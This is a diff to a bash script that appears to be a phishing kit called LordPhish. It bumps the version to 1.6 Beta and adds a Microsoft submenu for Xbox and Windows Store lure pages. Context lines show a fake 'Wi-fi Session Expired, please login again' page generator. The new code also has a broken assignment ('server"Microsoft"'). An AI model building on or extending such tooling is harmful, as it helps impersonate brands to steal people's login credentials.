@@ -67,7 +67,7 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m  .:.  Version 1.5 Beta  .:.   \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.6 Beta  .:.   \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -173,7 +173,7 @@ server="wordpress"
 start1
 
 elif [[ $menu_option == 16 ]]; then
-server="Microsoft"
+microsoft
 start1
 
 elif [[ $menu_option == 17 ]]; then
@@ -383,7 +383,7 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m  .:.  Version 1.5 Beta  .:.  \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.6 Beta  .:.  \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -614,6 +614,26 @@ printf "\e[1;93m [!] Invalid option!\e[0m\n"
 menu
 fi
 }
+microsoft () {
+    banner
+    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m xbox\e[0m\n"
+    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m windows store\e[0m\n"
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
+    
+if [[ $op_menu == 1 ]]; then
+server="xbox"
+start1
+    
+elif [[ $op_menu == 2 ]]; then
+server"Microsoft"
+start1
+
+else
+printf "\e[1;93m [!] Invalid option!\e[0m\n"
+menu
+fi
+}
+
 createpage() {
 default_cap1="Wi-fi Session Expired"
 default_cap2="Please login again."
